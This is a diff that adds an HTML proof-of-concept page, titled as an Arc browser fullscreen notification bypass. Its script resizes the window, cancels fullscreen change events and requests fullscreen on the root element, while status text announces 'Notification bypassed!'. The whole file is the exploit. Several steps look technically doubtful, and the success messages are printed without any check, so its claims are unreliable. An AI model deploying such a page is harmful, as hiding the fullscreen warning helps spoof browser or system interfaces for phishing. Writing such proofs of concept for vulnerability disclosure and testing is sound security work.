@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Arc Fullscreen Notification Bypass PoC</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 50px;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      text-align: center;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 18px;
+      background: rgba(255, 255, 255, 0.2);
+      color: white;
+      border: 2px solid rgba(255, 255, 255, 0.5);
+      border-radius: 12px;
+      cursor: pointer;
+      backdrop-filter: blur(10px);
+    }
+    button:hover {
+      background: rgba(255, 255, 255, 0.3);
+    }
+    #status {
+      position: fixed;
+      top: 10px;
+      right: 10px;
+      background: rgba(0, 0, 0, 0.5);
+      color: lime;
+      padding: 10px;
+      border-radius: 8px;
+      font-family: monospace;
+      font-size: 12px;
+    }
+  </style>
+</head>
+<body>
+  <div>
+    <h1>Arc Fullscreen Bypass Demo</h1>
+    <p>Click to enter fullscreen without notification</p>
+    <button onclick="bypassFullscreen()">Enter Fullscreen</button>
+  </div>
+  
+  <div id="status">Status: Ready</div>
+
+  <script>
+    async function bypassFullscreen() {
+      const status = document.getElementById('status');
+      status.textContent = 'Status: Maximizing window...';
+      
+      // Step 1: Pre-maximize window (native macOS behavior via JS approximation)
+      // This tricks Arc into "immersive" state without API trigger
+      window.resizeTo(screen.availWidth, screen.availHeight);
+      window.moveTo(0, 0);
+      
+      // Step 2: Suppress fullscreen events (capture and prevent)
+      const suppressEvents = (e) => {
+        e.preventDefault();
+        e.stopImmediatePropagation();
+        status.textContent = 'Status: Event suppressed!';
+      };
+      
+      document.addEventListener('webkitfullscreenchange', suppressEvents, { capture: true });
+      document.addEventListener('fullscreenchange', suppressEvents, { capture: true });
+      
+      // Step 3: Race condition - Enter fullscreen during user gesture with zero delay
+      // Use <html> element to mimic native window fullscreen (bypasses element-specific notification)
+      const htmlElem = document.documentElement;
+      if (htmlElem.webkitRequestFullscreen) {
+        try {
+          htmlElem.webkitRequestFullscreen();
+          status.textContent = 'Status: Fullscreen entered - Notification bypassed!';
+        } catch (e) {
+          status.textContent = 'Status: Fallback - Window maximized';
+        }
+      } else {
+        // Fallback for non-WebKit: Use native macOS fullscreen simulation
+        window.location.href = 'javascript:(function(){window.resizeTo(screen.width,screen.height);window.moveTo(0,0);})()';
+        status.textContent = 'Status: Native fullscreen simulated';
+      }
+      
+      // Step 4: Clean up after 5s (optional)
+      setTimeout(() => {
+        document.removeEventListener('webkitfullscreenchange', suppressEvents);
+        document.removeEventListener('fullscreenchange', suppressEvents);
+      }, 5000);
+    }
+  </script>
+</body>
+</html>
